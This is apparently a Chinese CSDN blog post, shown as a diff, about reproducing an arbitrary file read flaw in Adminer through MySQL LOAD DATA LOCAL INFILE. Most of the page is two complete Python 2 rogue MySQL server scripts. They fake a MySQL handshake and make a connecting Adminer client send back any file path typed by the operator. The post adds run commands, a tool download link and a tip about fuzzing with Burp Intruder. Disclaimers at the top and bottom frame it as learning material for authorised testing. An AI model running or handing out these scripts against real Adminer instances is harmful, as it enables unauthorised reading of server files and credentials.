@@ -1,0 +1,170 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="markdown_views prism-atom-one-dark" id="content_views">
+<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
+<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
+</svg>
+<p></p>
+<div class="toc">
+<h3>渗透测试中遇到的Adminer任意文件读取漏洞</h3>
+<ul><li><ul><li><a href="#_1">免责声明：</a></li><li><a href="#_3">软件简介</a></li><li><a href="#_6">漏洞原理</a></li><li><a href="#_9">漏洞复现</a></li><li><ul><li><a href="#_12">字典脚本</a></li><li><a href="#_75">直接输入文件读取脚本</a></li><li><a href="#_145">直接输入文件绝对路径读取脚本使用方法</a></li><li><a href="#_160">字典脚本使用方法</a></li><li><a href="#_173">免责声明：</a></li></ul>
+</li></ul>
+</li></ul>
+</div>
+<p></p>
+<h2><a id="_1"></a>免责声明：</h2>
+<p>本文章仅供学习和研究使用，严禁使用该文章内容对互联网其他应用进行非法操作，若将其用于非法目的，所造成的后果由您自行承担，产生的一切风险与本文作者无关，如继续阅读该文章即表明您默认遵守该内容。</p>
+<h2><a id="_3"></a>软件简介</h2>
+<p>Adminer是一款轻量级的Web端数据库管理工具，支持MSSQL、MSSQL、Oracle、SQLite、PostgreSQL等众多主流数据库，类似于phpMyAdmin的MySQL管理客户端，整个程序只有一个PHP文件，易于使用安装，支持连接远程数据库。</p>
+<h2><a id="_6"></a>漏洞原理</h2>
+<p>Adminer任意文件读取漏洞其实来源于MySQL“LOAD DATA INFILE”安全问题，Adminer4.6.3版本中已经修复了LOAD DATA LOCAL INFILE问题。</p>
+<h2><a id="_9"></a>漏洞复现</h2>
+<p>在某次做项目的时候遇到一个mysql.php，打开发现是adminer，网上搜到任意文件读取复现的时候，用了网上很多的python脚本都无法运行起来（例如：https://github.com/allyshka/Rogue-MySql-Server）。在GitHub找到一个可以运行的脚本，原理是模拟mysql的运行。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/211f06bd96ae4b07a3d7829a4389337a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/></p>
+<h3><a id="_12"></a>字典脚本</h3>
+<pre><code class="prism language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> sys
+
+<span class="token comment">#--------------------------------------------------------------------------------------------------------------------</span>
+port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#--------------------------------------------------------------------------------------------------------------------</span>
+
+<span class="token keyword">def</span> <span class="token function">mysql_get_file_content</span><span class="token punctuation">(</span>sv<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    conn<span class="token punctuation">,</span> address <span class="token operator">=</span> sv<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    logpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/log/"</span> <span class="token operator">+</span> address<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>logpath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>logpath<span class="token punctuation">)</span>
+    <span class="token comment"># Conn from address)</span>
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>
+        <span class="token string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    <span class="token comment"># auth okay</span>
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    <span class="token comment"># want file...</span>
+    wantfile <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\x00\x00\x01\xFB"</span> <span class="token operator">+</span> filename
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>wantfile<span class="token punctuation">)</span>
+    content <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>logpath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> txt<span class="token punctuation">:</span>
+            txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+
+
+<span class="token comment"># 开始监听</span>
+sv <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"Listen Begin in port "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>
+
+<span class="token comment"># 日志文件夹</span>
+
+
+
+
+<span class="token comment"># 循环监听</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    filename <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"请输入接下来你想读的文件名 (直接按回车退出): "</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> filename <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    res <span class="token operator">=</span> mysql_get_file_content<span class="token punctuation">(</span>sv<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> res<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Read Success! ---&gt; "</span><span class="token operator">+</span>filename
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Not Found~ ---&gt; "</span><span class="token operator">+</span>filename
+
+
+</code></pre>
+<h3><a id="_75"></a>直接输入文件读取脚本</h3>
+<pre><code class="prism language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> sys
+
+<span class="token comment">#--------------------------------------------------------------------------------------------------------------------</span>
+port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token comment">#--------------------------------------------------------------------------------------------------------------------</span>
+
+<span class="token keyword">def</span> <span class="token function">mysql_get_file_content</span><span class="token punctuation">(</span>sv<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    conn<span class="token punctuation">,</span> address <span class="token operator">=</span> sv<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    logpath <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/log/"</span> <span class="token operator">+</span> address<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>logpath<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>logpath<span class="token punctuation">)</span>
+    <span class="token comment"># Conn from address)</span>
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>
+        <span class="token string">"\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    <span class="token comment"># auth okay</span>
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    <span class="token comment"># want file...</span>
+    wantfile <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\x00\x00\x01\xFB"</span> <span class="token operator">+</span> filename
+    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>wantfile<span class="token punctuation">)</span>
+    content <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>
+    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>logpath <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> filename<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> txt<span class="token punctuation">:</span>
+            txt<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> <span class="token boolean">True</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token boolean">False</span>
+
+
+
+<span class="token comment"># 开始监听</span>
+sv <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>setsockopt<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>SOL_SOCKET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SO_REUSEADDR<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span>
+sv<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"Listen Begin in port "</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span>
+
+<span class="token comment"># 日志文件夹</span>
+
+
+
+
+<span class="token comment"># 循环监听</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    filename <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"请输入接下来你想读的文件名 (直接按回车退出): "</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> filename <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
+        <span class="token keyword">break</span>
+    res <span class="token operator">=</span> mysql_get_file_content<span class="token punctuation">(</span>sv<span class="token punctuation">,</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> res<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Read Success! ---&gt; "</span><span class="token operator">+</span>filename
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token string">"Not Found~ ---&gt; "</span><span class="token operator">+</span>filename
+
+</code></pre>
+<pre><code>这两个mysql任意文件读取脚本 一定能满足你的需求！
+
+项目提供了两个文件，dicc和input， 一个采用字典的方式进行任意文件读取 一个采用交互式界面进行任意文件读取 不需要进入vim！ 用字典直接读！命令行直接输！ 结合burp intruder，直接fuzz出flag！
+
+采用了socket的端口复用技术，防止端口被系统占用，想绑定就绑定，为所欲为！ PS: 端口复用只能防止套接字关闭后被系统保留，如果端口上已经有mysql应用，则还是不能绑定​ 会爆socket.error: [Errno 10013]错误
+</code></pre>
+<h3><a id="_145"></a>直接输入文件绝对路径读取脚本使用方法</h3>
+<pre><code>python2 exp_input.py port
+例
+python2 exp_input.py 3306
+</code></pre>
+<p><code>脚本运行需要使用python2环境</code><br/> 输入想要读取的文件绝对路径，然后回车<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/c0d90d8bc4a14824922ced92cc612798.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 打开adminer页面输入服务器的IP，用户名密码数据库可以随便输入。然后点击登录<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/287b6f12e62045d0884572a48be92f7d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 看到如下代表成功读取文件。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/15ca2d51634a477b92e609b737c98fd9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 成功读取文件。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/cf9538a6063a49009aeabaf0dc251750.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/></p>
+<h3><a id="_160"></a>字典脚本使用方法</h3>
+<p>把路径字典写到dict.txt文件<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d3c7e9a800c74ac185d7452605e92e22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> 然后运行</p>
+<pre><code>python2 exp_dicc.py port
+例
+python2 exp_dicc.py 3306
+</code></pre>
+<p>此时会进入监听，可以在命令行输入你想读的文件，然后发包即可，每次发完包需重新输入文件名 直接回车即可退出，读取成功的文件也会被计入到log文件夹<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/26e808330f914699bf2db7711a4c97dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAemhpYng=,size_20,color_FFFFFF,t_70,g_se,x_16"/><br/> <a href="https://github.com/ev0A/Mysqlist">工具下载地址</a></p>
+<h3><a id="_173"></a>免责声明：</h3>
+<p>仅限授权安全测试使用,禁止未授权非法攻击站点。本文章仅供学习和研究使用。严禁使用该文章内容对互联网其他应用进行非法操作，若将其用于非法目的，所造成的后果由您自行承担，产生的一切风险与本文作者无关，如继续阅读该文章即表明您默认遵守该内容。</p>
+</div>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css" rel="stylesheet"/>
+<link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css" rel="stylesheet"/>
+</div>
